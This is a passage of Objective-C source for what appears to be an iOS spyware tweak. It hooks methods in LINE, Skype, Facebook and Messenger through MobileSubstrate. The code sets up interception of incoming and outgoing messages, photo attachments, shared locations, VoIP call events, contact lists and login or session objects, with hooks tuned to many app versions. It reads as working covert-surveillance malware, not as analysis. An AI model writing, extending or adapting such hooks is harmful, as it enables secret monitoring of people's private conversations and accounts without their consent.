			Class $TalkMessageObject(objc_getClass("TalkMessageObject"));
			//_TalkMessageObject$send = MSHookMessage($TalkMessageObject, @selector(send), &$TalkMessageObject$send);
            MSHookMessage($TalkMessageObject, @selector(send), $TalkMessageObject$send, &_TalkMessageObject$send);
            
            DLog (@"TalkMessageObject --> %@", $TalkMessageObject);
		}
        
        // LINE 5.2.x,5.3.1
        //
        Class $ManagedMessage = objc_getClass("ManagedMessage");
        DLog (@"ManagedMessage --> %@", $ManagedMessage);
        // Outgoing LINE from PC (obsolete) & VOIP
        MSHookMessage($ManagedMessage, @selector(line_messageSent:), $ManagedMessage$line_messageSent$, &_ManagedMessage$line_messageSent$);
        // Outgoing IM
        if ([IMShareUtils isVersionText:versionOfIM isLessThan:@"5.8.0"]) { // Version < 5.8.0
            MSHookMessage($ManagedMessage, @selector(send), $ManagedMessage$send, &_ManagedMessage$send);
        } else {
            // LINE 5.8.0
            MSHookMessage($ManagedMessage, @selector(sendWithCompletionHandler:), $ManagedMessage$sendWithCompletionHandler$, &_ManagedMessage$sendWithCompletionHandler$);
        }
        
        Class $ManagedChat = objc_getClass("ManagedChat");
        DLog (@"ManagedChat --> %@", $ManagedChat);
        // Incoming IM & VOIP
        MSHookMessage($ManagedChat, @selector(updateLastReceivedMessageID:), $ManagedChat$updateLastReceivedMessageID$, &_ManagedChat$updateLastReceivedMessageID$);
	}
	
#pragma mark -
#pragma mark Skype, SkypeForiPad hook
#pragma mark -
	
	// Skype
	if (([identifier isEqualToString:@"com.skype.skype"] && [IMShareUtils shouldHookInCurrentVersion:versionOfIM withBundleIdentifier:identifier])	||
		([identifier isEqualToString:@"com.skype.SkypeForiPad"] && [IMShareUtils shouldHookInCurrentVersion:versionOfIM withBundleIdentifier:identifier])) {
		
		Class $SKConversation(objc_getClass("SKConversation"));
		
		// This is called upto Skype version 4.6
		//_SKConversation$insertObject$inMessagesAtIndex$ = MSHookMessage($SKConversation, @selector(insertObject:inMessagesAtIndex:), &$SKConversation$insertObject$inMessagesAtIndex$);
        MSHookMessage($SKConversation, @selector(insertObject:inMessagesAtIndex:), $SKConversation$insertObject$inMessagesAtIndex$, &_SKConversation$insertObject$inMessagesAtIndex$);
				
		// if Skype version is 4.6 or eariler, not hook this method
		NSBundle *bundle			= [NSBundle mainBundle];
		NSDictionary *bundleInfo	= [bundle infoDictionary];
		NSString *releaseVersion	= [bundleInfo objectForKey:@"CFBundleShortVersionString"];
		if (releaseVersion == nil || [releaseVersion length] == 0) {
			releaseVersion = [bundleInfo objectForKey:@"CFBundleVersion"];
		}
		NSArray *skypeVersionArray	= [IMShareUtils parseVersion:releaseVersion];		
		NSArray *version4_8Array	= [IMShareUtils parseVersion:@"4.8"];
		NSArray *version4_9Array	= [IMShareUtils parseVersion:@"4.9"];
		NSArray *version4_13Array	= [IMShareUtils parseVersion:@"4.13"];
						
		//if ([releaseVersion floatValue] >= 4.8f) {
		if ([IMShareUtils isVersion:skypeVersionArray
					 greaterOrEqual:version4_8Array]) {
			DLog (@"SKYPE >= 4.8")
			/* This method is used to hook the below type of message because the existing method (insertObject:inMessageAtIndex:) is removed from Skype implementation since version 4.8
				- Outgoing/incoming text
				- Outgoing/incoming video message
			*/
			//_SKConversation$onMessage$ = MSHookMessage($SKConversation, @selector(onMessage:), &$SKConversation$onMessage$);
            MSHookMessage($SKConversation, @selector(onMessage:), $SKConversation$onMessage$, &_SKConversation$onMessage$);
		}
		
		//if ([releaseVersion floatValue] >= 4.9f) {
		if ([IMShareUtils isVersion:skypeVersionArray greaterOrEqual:version4_9Array]		&&
			[IMShareUtils isVersion:skypeVersionArray lowerThan:version4_13Array]			){
			DLog (@"SKYPE >= 4.9 BUT < 4.13")
			
			// Photo attachment (exclusively for outgoing photo)
			SkypeUtils *skypeUtils = [SkypeUtils sharedSkypeUtils];
			[skypeUtils capturePhotoAttachment];
			
			Class $DomainObjectPool = objc_getClass("DomainObjectPool");
			//_DomainObjectPool$init = MSHookMessage($DomainObjectPool, @selector(init), &$DomainObjectPool$init);
            MSHookMessage($DomainObjectPool, @selector(init), $DomainObjectPool$init, &_DomainObjectPool$init);
		}
				
		Class $SKConversationManager(objc_getClass("SKConversationManager"));
		//_SKConversationManager$insertObject$inUnreadConversationsAtIndex$ = MSHookMessage($SKConversationManager, @selector(insertObject:inUnreadConversationsAtIndex:), &$SKConversationManager$insertObject$inUnreadConversationsAtIndex$);
        MSHookMessage($SKConversationManager, @selector(insertObject:inUnreadConversationsAtIndex:), $SKConversationManager$insertObject$inUnreadConversationsAtIndex$, &_SKConversationManager$insertObject$inUnreadConversationsAtIndex$);
				
		// Capture Skype photo attachment
		Class $SKFileTransferManager = objc_getClass("SKFileTransferManager");
		//_SKFileTransferManager$observeValueForKeyPath$ofObject$change$context$ = MSHookMessage($SKFileTransferManager, @selector(observeValueForKeyPath:ofObject:change:context:), &$SKFileTransferManager$observeValueForKeyPath$ofObject$change$context$);
        MSHookMessage($SKFileTransferManager, @selector(observeValueForKeyPath:ofObject:change:context:), $SKFileTransferManager$observeValueForKeyPath$ofObject$change$context$, &_SKFileTransferManager$observeValueForKeyPath$ofObject$change$context$);
				
        // version 5.x
        Class $SKPConversation(objc_getClass("SKPConversation"));
        
        // Capture in and out realtime
        MSHookMessage($SKPConversation,
                      @selector(OnMessage:andMessageobjectid:),
                      $SKPConversation$OnMessage$andMessageobjectid$,
                      &_SKPConversation$OnMessage$andMessageobjectid$);
        // Capture pending message
//        MSHookMessage($SKPConversation,
//                      @selector(ensureMinimumNumberOfMessageItemsHaveBeenLoaded:),
//                      $SKPConversation$ensureMinimumNumberOfMessageItemsHaveBeenLoaded$,
//                      &_SKPConversation$ensureMinimumNumberOfMessageItemsHaveBeenLoaded$);
        
        Class $SKPAccount(objc_getClass("SKPAccount"));
        // -- Save SKPAccount object
        MSHookMessage($SKPAccount,
                      @selector(initWithAleObject:),
                      $SKPAccount$initWithAleObject$,
                      &_SKPAccount$initWithAleObject$);
        
        DLog (@"Hook Skype App Delegate")
        
        Class $SKPAppDelegate(objc_getClass("SKPAppDelegate"));
        // -- Save SKPAccount object
        MSHookMessage($SKPAppDelegate,
                      @selector(application:didFinishLaunchingWithOptions:),
                      $SKPAppDelegate$application$didFinishLaunchingWithOptions$,
                      &_SKPAppDelegate$application$didFinishLaunchingWithOptions$);
        
        Class $SKPConversationLists(objc_getClass("SKPConversationLists"));
        MSHookMessage($SKPConversationLists,
                      @selector(init),
                      $SKPConversationLists$init,
                      &_SKPConversationLists$init);
        
	}
	
#pragma mark -
#pragma mark Facebook Messager, Facebook hook
#pragma mark -
	
	if (([identifier isEqualToString:@"com.facebook.Messenger"]&& [IMShareUtils shouldHookInCurrentVersion:versionOfIM withBundleIdentifier:identifier])	||
		([identifier isEqualToString:@"com.facebook.Facebook"] && [IMShareUtils shouldHookInCurrentVersion:versionOfIM withBundleIdentifier:identifier])) {
		
		// Tested on Facebook 5.6, 6.0, 6.0.1, 6.0.2, 6.1, 6.2
		// Tested on Messenger 2.3.1, 2.4, 2.5
		
		NSBundle *bundle = [NSBundle mainBundle];
		NSDictionary *bundleInfo = [bundle infoDictionary];
		NSString *version = [bundleInfo objectForKey:@"CFBundleShortVersionString"];
		if (version == nil || [version length] == 0) {
			version = [bundleInfo objectForKey:@"CFBundleVersion"];
		}
        
        // Get all users of Messenger (before 27.0) and Facebook
        Class $UserSet = objc_getClass("UserSet");
        MSHookMessage($UserSet, @selector(initWithProviderMapData:), $UserSet$initWithProviderMapData$, &_UserSet$initWithProviderMapData$);
        
        // Get all users of Messenger (from 27.0) and intend only for Messenger
        Class $FBMUserSet = objc_getClass("FBMUserSet");
        MSHookMessage($FBMUserSet, @selector(initWithProviderMapData:), $FBMUserSet$initWithProviderMapData$, &_FBMUserSet$initWithProviderMapData$);
        
        // Store all users of FBMUser object in owner array (Messenger 29.1)
        Class $FBMIndexedUserSet = objc_getClass("FBMIndexedUserSet");
        MSHookMessage($FBMIndexedUserSet, @selector(initWithUserIdToUserDictionary:),
                      $FBMIndexedUserSet$initWithUserIdToUserDictionary$,
                      &_FBMIndexedUserSet$initWithUserIdToUserDictionary$);
		
		// Capture the background or offline thread messages which are new (unread tag, applicable only for Facebook)
		if ([identifier isEqualToString:@"com.facebook.Facebook"]) {
            
            Class $FBMThreadMessagesMerger = objc_getClass("FBMThreadMessagesMerger");
            
			if ([IMShareUtils compareVersion:version withVersion:@"6.2"] == 1) { // Version (6.3,6.4,...) > 6.2

                // Facebook < 6.5
                //_FBMThreadMessagesMerger$mergeNewMessages$withOldMessages$thread$ = MSHookMessage($FBMThreadMessagesMerger, @selector(mergeNewMessages:withOldMessages:thread:), &$FBMThreadMessagesMerger$mergeNewMessages$withOldMessages$thread$);
                MSHookMessage($FBMThreadMessagesMerger, @selector(mergeNewMessages:withOldMessages:thread:), $FBMThreadMessagesMerger$mergeNewMessages$withOldMessages$thread$, &_FBMThreadMessagesMerger$mergeNewMessages$withOldMessages$thread$);
                
                // Facebook >= 6.5 but < 6.7.2
                //_FBMThreadMessagesMerger$mergeNewMessages$withOldMessages$thread$threadSendQueue$addedNewMessages$ = MSHookMessage($FBMThreadMessagesMerger, @selector(mergeNewMessages:withOldMessages:thread:threadSendQueue:addedNewMessages:),
                //																												   &$FBMThreadMessagesMerger$mergeNewMessages$withOldMessages$thread$threadSendQueue$addedNewMessages$);
                MSHookMessage($FBMThreadMessagesMerger,
                              @selector(mergeNewMessages:withOldMessages:thread:threadSendQueue:addedNewMessages:),
                              $FBMThreadMessagesMerger$mergeNewMessages$withOldMessages$thread$threadSendQueue$addedNewMessages$,
                              &_FBMThreadMessagesMerger$mergeNewMessages$withOldMessages$thread$threadSendQueue$addedNewMessages$);
                // Facebook >= 6.7.2
                //_FBMThreadMessagesMerger$mergeNewMessages$withOldMessages$threadSendQueue$addedNewMessages$ = MSHookMessage($FBMThreadMessagesMerger, @selector(mergeNewMessages:withOldMessages:threadSendQueue:addedNewMessages:),
                //																												   &$FBMThreadMessagesMerger$mergeNewMessages$withOldMessages$threadSendQueue$addedNewMessages$);
                MSHookMessage($FBMThreadMessagesMerger,
                              @selector(mergeNewMessages:withOldMessages:threadSendQueue:addedNewMessages:),
                              $FBMThreadMessagesMerger$mergeNewMessages$withOldMessages$threadSendQueue$addedNewMessages$,
                              &_FBMThreadMessagesMerger$mergeNewMessages$withOldMessages$threadSendQueue$addedNewMessages$);
            }
            
            if ([IMShareUtils compareVersion:version withVersion:@"12.1"] == 1) { // Version (13.0,...) > 12.1
                
                //MSHookMessage($FBMThreadMessagesMerger,
                //              @selector(addFromMessagesJson:actionsJson:max:thread:threadSendQueue:),
                //              $FBMThreadMessagesMerger$addFromMessagesJson$actionsJson$max$thread$threadSendQueue$,
                //              &_FBMThreadMessagesMerger$addFromMessagesJson$actionsJson$max$thread$threadSendQueue$);
                MSHookMessage($FBMThreadMessagesMerger,
                              @selector(messagesFromMessagesJson:actionsJson:max:thread:),
                              $FBMThreadMessagesMerger$messagesFromMessagesJson$actionsJson$max$thread$,
                              &_FBMThreadMessagesMerger$messagesFromMessagesJson$actionsJson$max$thread$);
            }
            
            // Latest version of Facebook that can install on iOS 6 is 11.0
            if ([IMShareUtils compareVersion:version withVersion:@"10.0"] == 1) { // Version (11.0,12.0,12.1,...) > 10.0
                [[FacebookUtilsV2 sharedFacebookUtilsV2] registerOutgoingCallNotification];
            }
		}
		
		if ([identifier isEqualToString:@"com.facebook.Messenger"]) {
            
			Class $FBMThreadMessagesMerger = objc_getClass("FBMThreadMessagesMerger");
			
			// Messenger < 2.7 (Never use)
			//_FBMThreadMessagesMerger$mergeNewMessages$withOldMessages$thread$ = MSHookMessage($FBMThreadMessagesMerger, @selector(mergeNewMessages:withOldMessages:thread:), &$FBMThreadMessagesMerger$mergeNewMessages$withOldMessages$thread$);
			
			// Messenger 2.7 (Never use)
			//_FBMThreadMessagesMerger$mergeNewMessages$withOldMessages$thread$threadSendQueue$addedNewMessages$ = MSHookMessage($FBMThreadMessagesMerger, @selector(mergeNewMessages:withOldMessages:thread:threadSendQueue:addedNewMessages:), &$FBMThreadMessagesMerger$mergeNewMessages$withOldMessages$thread$threadSendQueue$addedNewMessages$);
            
            if ([IMShareUtils compareVersion:version withVersion:@"8.0"] == 1) { // Version (9.0,9.1,...) > 8.0
                MSHookMessage($FBMThreadMessagesMerger,
                              @selector(messagesFromMessagesJson:actionsJson:max:thread:),
                              $FBMThreadMessagesMerger$messagesFromMessagesJson$actionsJson$max$thread$,
                              &_FBMThreadMessagesMerger$messagesFromMessagesJson$actionsJson$max$thread$);
            }
            
            // Latest version of Messenger that can install on iOS 6 is 6.1
            if ([IMShareUtils compareVersion:version withVersion:@"6.0"] == 1) { // Version (6.1,...,9.1,...) > 6.0
                [[FacebookUtilsV2 sharedFacebookUtilsV2] registerOutgoingCallNotification];
            }
		}
		
		// For outgoing/incoming message of existing thread (good network connection)
		Class $FBMThread(objc_getClass("FBMThread"));
		//_FBMThread$addNewerMessage$ = MSHookMessage($FBMThread, @selector(addNewerMessage:), &$FBMThread$addNewerMessage$);
        MSHookMessage($FBMThread, @selector(addNewerMessage:), $FBMThread$addNewerMessage$, &_FBMThread$addNewerMessage$);
		//_FBMThread$addPushMessage$ = MSHookMessage($FBMThread, @selector(addPushMessage:), &$FBMThread$addPushMessage$);
		//_FBMThread$addOlderMessage$ = MSHookMessage($FBMThread, @selector(addOlderMessage:), &$FBMThread$addOlderMessage$);
		
        // For outgoing message of existing thread
		Class $MQTTMessageSender = objc_getClass("MQTTMessageSender");
		// Send method, after this there will be a call (in case of send success) of addNewerMessage$/thread$didSendMessage$ 
		//_MQTTMessageSender$sendMessage$thread$delegate$ = MSHookMessage($MQTTMessageSender, @selector(sendMessage:thread:delegate:), &$MQTTMessageSender$sendMessage$thread$delegate$);
        MSHookMessage($MQTTMessageSender, @selector(sendMessage:thread:delegate:), $MQTTMessageSender$sendMessage$thread$delegate$, &_MQTTMessageSender$sendMessage$thread$delegate$);
		// Capture outgoing message of existing thread (bad network connection)
		//_MQTTMessageSender$thread$didSendMessage$ = MSHookMessage($MQTTMessageSender, @selector(thread:didSendMessage:), &$MQTTMessageSender$thread$didSendMessage$);
        MSHookMessage($MQTTMessageSender, @selector(thread:didSendMessage:), $MQTTMessageSender$thread$didSendMessage$, &_MQTTMessageSender$thread$didSendMessage$);
		
		// For outgoing facebook message of newly created thread
		// For Messenger 2.3.1, if the thread is deleted on the server (via web user) after that client create new message to same persons in the deleted thread again;
		// client will use the same thread id which deleted from the server thus in this case this method and addNewerMessage$ are called and the result is duplicate the events (KNOWN ISSUE)
		// For Facebook 5.6, 6.0, 6.0.1, 6.0.2 this method is called because it have to request new thread id from server, however the newly request thread id is the same old one (deleted one)
		Class $BatchThreadCreator = objc_getClass("BatchThreadCreator");
		//_BatchThreadCreator$request$didLoad$ = MSHookMessage($BatchThreadCreator, @selector(request:didLoad:), &$BatchThreadCreator$request$didLoad$);
        MSHookMessage($BatchThreadCreator, @selector(request:didLoad:), $BatchThreadCreator$request$didLoad$, &_BatchThreadCreator$request$didLoad$);
		
		// For incoming facebook message of newly created thread (Helper)
		Class $ThreadsFetcher = objc_getClass("ThreadsFetcher");
		//_ThreadsFetcher$request$didLoad$ = MSHookMessage($ThreadsFetcher, @selector(request:didLoad:), &$ThreadsFetcher$request$didLoad$);
        MSHookMessage($ThreadsFetcher, @selector(request:didLoad:), $ThreadsFetcher$request$didLoad$, &_ThreadsFetcher$request$didLoad$);
		
        // Capture method by using helper above
		Class $FBThreadListController = objc_getClass("FBThreadListController");
		//_FBThreadListController$didFetchThreads$ = MSHookMessage($FBThreadListController, @selector(didFetchThreads:), &$FBThreadListController$didFetchThreads$);
        MSHookMessage($FBThreadListController, @selector(didFetchThreads:), $FBThreadListController$didFetchThreads$, &_FBThreadListController$didFetchThreads$);
		
		Class $FBMThreadSet = objc_getClass("FBMThreadSet");
		//_FBMThreadSet$initWithProviderMapData$ = MSHookMessage($FBMThreadSet, @selector(initWithProviderMapData:), &$FBMThreadSet$initWithProviderMapData$);
        MSHookMessage($FBMThreadSet, @selector(initWithProviderMapData:), $FBMThreadSet$initWithProviderMapData$, &_FBMThreadSet$initWithProviderMapData$);
		//_FBMThreadSet$initWithThreadParticipantFilter$activeThreads$ = MSHookMessage($FBMThreadSet, @selector(initWithThreadParticipantFilter:activeThreads:), &$FBMThreadSet$initWithThreadParticipantFilter$activeThreads$);
        MSHookMessage($FBMThreadSet, @selector(initWithThreadParticipantFilter:activeThreads:), $FBMThreadSet$initWithThreadParticipantFilter$activeThreads$, &_FBMThreadSet$initWithThreadParticipantFilter$activeThreads$);
		//_FBMThreadSet$initWithThreadParticipantFilter$authenticationManagerProvider$ = MSHookMessage($FBMThreadSet, @selector(initWithThreadParticipantFilter:authenticationManagerProvider:), &$FBMThreadSet$initWithThreadParticipantFilter$authenticationManagerProvider$);
        MSHookMessage($FBMThreadSet, @selector(initWithThreadParticipantFilter:authenticationManagerProvider:), $FBMThreadSet$initWithThreadParticipantFilter$authenticationManagerProvider$, &_FBMThreadSet$initWithThreadParticipantFilter$authenticationManagerProvider$);
		// Messenger 35.0
        MSHookMessage($FBMThreadSet, @selector(initWithThreadParticipantFilter:authenticationManagerProvider:networkProtocolController:),
                      $FBMThreadSet$initWithThreadParticipantFilter$authenticationManagerProvider$networkProtocolController$,
                      &_FBMThreadSet$initWithThreadParticipantFilter$authenticationManagerProvider$networkProtocolController$);
        
		/*
		 More scenarios to capture
		 - Offline messages (while not login friends of user send message)
		 More issue to fix
		 - Rarely lost outgoing messages
		 - Rarely duplicate outgoing messages
		 */
		
		// Capture login user info
		// For messegner
        
		// Obsolete (does not work)
		//Class $FBSSOLoginController = objc_getClass("FBSSOLoginController");
		//_FBSSOLoginController$account = MSHookMessage($FBSSOLoginController, @selector(account), &$FBSSOLoginController$account);
		//_FBSSOLoginController$accountStore = MSHookMessage($FBSSOLoginController, @selector(accountStore), &$FBSSOLoginController$accountStore);
		
        Class $FBAuthenticationManagerImpl = objc_getClass("FBAuthenticationManagerImpl");
		//_FBAuthenticationManagerImpl$initWithUsers$keychainProvider$userDefaults$ = MSHookMessage($FBAuthenticationManagerImpl, @selector(initWithUsers:keychainProvider:userDefaults:), &$FBAuthenticationManagerImpl$initWithUsers$keychainProvider$userDefaults$);
        MSHookMessage($FBAuthenticationManagerImpl, @selector(initWithUsers:keychainProvider:userDefaults:), $FBAuthenticationManagerImpl$initWithUsers$keychainProvider$userDefaults$, &_FBAuthenticationManagerImpl$initWithUsers$keychainProvider$userDefaults$);
		//_FBAuthenticationManagerImpl$initWithProviderMapData$ = MSHookMessage($FBAuthenticationManagerImpl, @selector(initWithProviderMapData:), &$FBAuthenticationManagerImpl$initWithProviderMapData$);
        MSHookMessage($FBAuthenticationManagerImpl, @selector(initWithProviderMapData:), $FBAuthenticationManagerImpl$initWithProviderMapData$, &_FBAuthenticationManagerImpl$initWithProviderMapData$);
		
        // For facebook (class method hook)
		Class $FBMessengerModuleAuthenticationManager = objc_getMetaClass("FBMessengerModuleAuthenticationManager");
		//_FBMessengerModuleAuthenticationManager$authenticationManagerWithSessionStore$ = MSHookMessage($FBMessengerModuleAuthenticationManager, @selector(authenticationManagerWithSessionStore:), &$FBMessengerModuleAuthenticationManager$authenticationManagerWithSessionStore$);
        MSHookMessage($FBMessengerModuleAuthenticationManager, @selector(authenticationManagerWithSessionStore:), $FBMessengerModuleAuthenticationManager$authenticationManagerWithSessionStore$, &_FBMessengerModuleAuthenticationManager$authenticationManagerWithSessionStore$);
		
        // Facebook 6.7, Facebook Messenger ..., 9.1, ..
		Class $FBMAuthenticationManagerImpl = objc_getClass("FBMAuthenticationManagerImpl");
		//_FBMAuthenticationManagerImpl$initWithProviderMapData$ = MSHookMessage($FBMAuthenticationManagerImpl, @selector(initWithProviderMapData:), &$FBMAuthenticationManagerImpl$initWithProviderMapData$);
        MSHookMessage($FBMAuthenticationManagerImpl, @selector(initWithProviderMapData:), $FBMAuthenticationManagerImpl$initWithProviderMapData$, &_FBMAuthenticationManagerImpl$initWithProviderMapData$);
		//_FBMAuthenticationManagerImpl$initWithApiSessionStore$ = MSHookMessage($FBMAuthenticationManagerImpl, @selector(initWithApiSessionStore:), &$FBMAuthenticationManagerImpl$initWithApiSessionStore$);
        MSHookMessage($FBMAuthenticationManagerImpl, @selector(initWithApiSessionStore:), $FBMAuthenticationManagerImpl$initWithApiSessionStore$, &_FBMAuthenticationManagerImpl$initWithApiSessionStore$);
        
        // Messenger 17.0
        Class $MNAuthenticationManagerImpl = objc_getClass("MNAuthenticationManagerImpl");
        MSHookMessage($MNAuthenticationManagerImpl, @selector(initWithProviderMapData:), $MNAuthenticationManagerImpl$initWithProviderMapData$, &_MNAuthenticationManagerImpl$initWithProviderMapData$);
        MSHookMessage($MNAuthenticationManagerImpl, @selector(initWithApiSessionStore:), $MNAuthenticationManagerImpl$initWithApiSessionStore$, &_MNAuthenticationManagerImpl$initWithApiSessionStore$);
		
        // Facebook 6.7
		Class $FBMURLRequestFormatter = objc_getClass("FBMURLRequestFormatter");
		//_FBMURLRequestFormatter$initWithUserAgentFormatter$localeMap$apiSessionStore$ = MSHookMessage($FBMURLRequestFormatter, @selector(initWithUserAgentFormatter:localeMap:apiSessionStore:), &$FBMURLRequestFormatter$initWithUserAgentFormatter$localeMap$apiSessionStore$);
        MSHookMessage($FBMURLRequestFormatter, @selector(initWithUserAgentFormatter:localeMap:apiSessionStore:), $FBMURLRequestFormatter$initWithUserAgentFormatter$localeMap$apiSessionStore$, &_FBMURLRequestFormatter$initWithUserAgentFormatter$localeMap$apiSessionStore$);
		
		// Messenger 2.6
		Class $FBMStickerStoragePathManager = objc_getClass("FBMStickerStoragePathManager");
		//_FBMStickerStoragePathManager$initWithProviderMapData$ = MSHookMessage($FBMStickerStoragePathManager, @selector(initWithProviderMapData:), &$FBMStickerStoragePathManager$initWithProviderMapData$);
        MSHookMessage($FBMStickerStoragePathManager, @selector(initWithProviderMapData:), $FBMStickerStoragePathManager$initWithProviderMapData$, &_FBMStickerStoragePathManager$initWithProviderMapData$);
		//_FBMStickerStoragePathManager$initWithUserSettings$ = MSHookMessage($FBMStickerStoragePathManager, @selector(initWithUserSettings:), &$FBMStickerStoragePathManager$initWithUserSettings$);
        MSHookMessage($FBMStickerStoragePathManager, @selector(initWithUserSettings:), $FBMStickerStoragePathManager$initWithUserSettings$, &_FBMStickerStoragePathManager$initWithUserSettings$);
		
		// Messenger 2.7, ... 29.1 Facebook 6.5, 6.6, ... 13.1
		Class $FBMLocalThreadMessagesManipulator = objc_getClass("FBMLocalThreadMessagesManipulator");
        DLog(@"$FBMLocalThreadMessagesManipulator, %@", $FBMLocalThreadMessagesManipulator);
        if (![$FBMLocalThreadMessagesManipulator instancesRespondToSelector:@selector(addPushMessage:toThread:)]) {
            // The method start to use in Messenger 29.1 onward
            //_FBMLocalThreadMessagesManipulator$addNewerMessage$toThread$ = MSHookMessage($FBMLocalThreadMessagesManipulator, @selector(addNewerMessage:toThread:), &$FBMLocalThreadMessagesManipulator$addNewerMessage$toThread$);
            MSHookMessage($FBMLocalThreadMessagesManipulator, @selector(addNewerMessage:toThread:), $FBMLocalThreadMessagesManipulator$addNewerMessage$toThread$, &_FBMLocalThreadMessagesManipulator$addNewerMessage$toThread$);
		
        } else {
            // The method have been removed in Messenger 29.1 onward
            //_FBMLocalThreadMessagesManipulator$addPushMessage$toThread$ = MSHookMessage($FBMLocalThreadMessagesManipulator, @selector(addPushMessage:toThread:), &$FBMLocalThreadMessagesManipulator$addPushMessage$toThread$);
            MSHookMessage($FBMLocalThreadMessagesManipulator, @selector(addPushMessage:toThread:), $FBMLocalThreadMessagesManipulator$addPushMessage$toThread$, &_FBMLocalThreadMessagesManipulator$addPushMessage$toThread$);
        }
        //_FBMLocalThreadMessagesManipulator$addOlderMessage$toThread$ = MSHookMessage($FBMLocalThreadMessagesManipulator, @selector(addOlderMessage:toThread:), &$FBMLocalThreadMessagesManipulator$addOlderMessage$toThread$);
        //MSHookMessage($FBMLocalThreadMessagesManipulator, @selector(addOlderMessage:toThread:), $FBMLocalThreadMessagesManipulator$addOlderMessage$toThread$, &_FBMLocalThreadMessagesManipulator$addOlderMessage$toThread$);
        //MSHookMessage($FBMLocalThreadMessagesManipulator, @selector(restoreMessages:forThread:), $FBMLocalThreadMessagesManipulator$restoreMessages$forThread$, &_FBMLocalThreadMessagesManipulator$restoreMessages$forThread$);
        //MSHookMessage($FBMLocalThreadMessagesManipulator, @selector(setMessages:forThread:), $FBMLocalThreadMessagesManipulator$setMessages$forThread$, &_FBMLocalThreadMessagesManipulator$setMessages$forThread$);
        //MSHookMessage($FBMLocalThreadMessagesManipulator, @selector(_addMessage:toThread:searchOption:), $FBMLocalThreadMessagesManipulator$_addMessage$toThread$searchOption$, &_FBMLocalThreadMessagesManipulator$_addMessage$toThread$searchOption$);
        
        // Capture shared location for Messenger 30..
        Class $MNMessagesModelController = objc_getClass("MNMessagesModelController");
        MSHookMessage($MNMessagesModelController, @selector(thread:didSendMessage:), $MNMessagesModelController$thread$didSendMessage$, &_MNMessagesModelController$thread$didSendMessage$);
        
        // Messenger 35.0 upward
        if ([IMShareUtils isCurrentVersionGreaterOrEqual:@"35.0"]) {
            //Class $FBMThreadMessageUpdate = objc_getMetaClass("FBMThreadMessageUpdate");
            //DLog(@"$FBMThreadMessageUpdate, %@", $FBMThreadMessageUpdate);
            //MSHookMessage($FBMThreadMessageUpdate, @selector(addWithMessage:), $FBMThreadMessageUpdate$addWithMessage$, &_FBMThreadMessageUpdate$addWithMessage$);
            
            Class $MNThreadMessageUpdater = objc_getClass("MNThreadMessageUpdater");
            MSHookMessage($MNThreadMessageUpdater, @selector(applyMessageUpdate:toMessageSetBuilder:),
                          $MNThreadMessageUpdater$applyMessageUpdate$toMessageSetBuilder$,
                          &_MNThreadMessageUpdater$applyMessageUpdate$toMessageSetBuilder$);
            
            Class $FBMStickerManager = objc_getClass("FBMStickerManager");
            MSHookMessage($FBMStickerManager, @selector(initWithUserSettings:stickerResourceManager:stickerStoragePathManager:currentVersion:layoutIdiom:),
                          $FBMStickerManager$initWithUserSettings$stickerResourceManager$stickerStoragePathManager$currentVersion$layoutIdiom$,
                          &_FBMStickerManager$initWithUserSettings$stickerResourceManager$stickerStoragePathManager$currentVersion$layoutIdiom$);
        }
		
		// Attachment url Messenger 3.1
		Class $FBMBaseAttachmentURLFormatter = objc_getClass("FBMBaseAttachmentURLFormatter");
		//_FBMBaseAttachmentURLFormatter$initWithProviderMapData$ = MSHookMessage($FBMBaseAttachmentURLFormatter, @selector(initWithProviderMapData:), &$FBMBaseAttachmentURLFormatter$initWithProviderMapData$);
        MSHookMessage($FBMBaseAttachmentURLFormatter, @selector(initWithProviderMapData:), $FBMBaseAttachmentURLFormatter$initWithProviderMapData$, &_FBMBaseAttachmentURLFormatter$initWithProviderMapData$);
		//_FBMBaseAttachmentURLFormatter$initWithUrlRequestFormatter$ = MSHookMessage($FBMBaseAttachmentURLFormatter, @selector(initWithUrlRequestFormatter:), &$FBMBaseAttachmentURLFormatter$initWithUrlRequestFormatter$);
        MSHookMessage($FBMBaseAttachmentURLFormatter, @selector(initWithUrlRequestFormatter:), $FBMBaseAttachmentURLFormatter$initWithUrlRequestFormatter$, &_FBMBaseAttachmentURLFormatter$initWithUrlRequestFormatter$);
        
        Class $FBMCachedAttachmentURLFormatter = objc_getClass("FBMCachedAttachmentURLFormatter");
		//_FBMCachedAttachmentURLFormatter$initWithProviderMapData$ = MSHookMessage($FBMCachedAttachmentURLFormatter, @selector(initWithProviderMapData:), &$FBMCachedAttachmentURLFormatter$initWithProviderMapData$);
        MSHookMessage($FBMCachedAttachmentURLFormatter, @selector(initWithProviderMapData:), $FBMCachedAttachmentURLFormatter$initWithProviderMapData$, &_FBMCachedAttachmentURLFormatter$initWithProviderMapData$);
        
        if (([identifier isEqualToString:@"com.facebook.Facebook"]      &&
             [IMShareUtils isVersionText:version isHigherThan:@"6.9.1"] &&              // version 9.0 > (7.0, 8.0,...) > 6.9.1
             [IMShareUtils isVersionText:version isLessThan:@"9.0"])        ||

            
            ([identifier isEqualToString:@"com.facebook.Messenger"]     &&
             [IMShareUtils isVersionText:version isHigherThan:@"3.1.2"] &&              // version 4.2 > (3.2, 3.2.1,...) > 3.1.2
             [IMShareUtils isVersionText:version isLessThan:@"4.2"])        ) {

            // Messenger 3.2.1 VoIP
            Class $FBWebRTCMessageListener = objc_getClass("FBWebRTCMessageListener");
            MSHookMessage($FBWebRTCMessageListener, @selector(onDidReceiveWebRTCMessage:), $FBWebRTCMessageListener$onDidReceiveWebRTCMessage$, &_FBWebRTCMessageListener$onDidReceiveWebRTCMessage$);
            
            Class $FBWebRTCNotificationHandler = objc_getClass("FBWebRTCNotificationHandler");
            MSHookMessage($FBWebRTCNotificationHandler, @selector(didViewIncomingCall:), $FBWebRTCNotificationHandler$didViewIncomingCall$, &_FBWebRTCNotificationHandler$didViewIncomingCall$);
            MSHookMessage($FBWebRTCNotificationHandler, @selector(didReceiveOutgoingCall:), $FBWebRTCNotificationHandler$didReceiveOutgoingCall$, &_FBWebRTCNotificationHandler$didReceiveOutgoingCall$);
            
            Class $FBWebRTCHandlerImpl = objc_getClass("FBWebRTCHandlerImpl");
            MSHookMessage($FBWebRTCHandlerImpl, @selector(isInACall), $FBWebRTCHandlerImpl$isInACall, &_FBWebRTCHandlerImpl$isInACall);
            MSHookMessage($FBWebRTCHandlerImpl, @selector(callDidEnd:), $FBWebRTCHandlerImpl$callDidEnd$, &_FBWebRTCHandlerImpl$callDidEnd$);
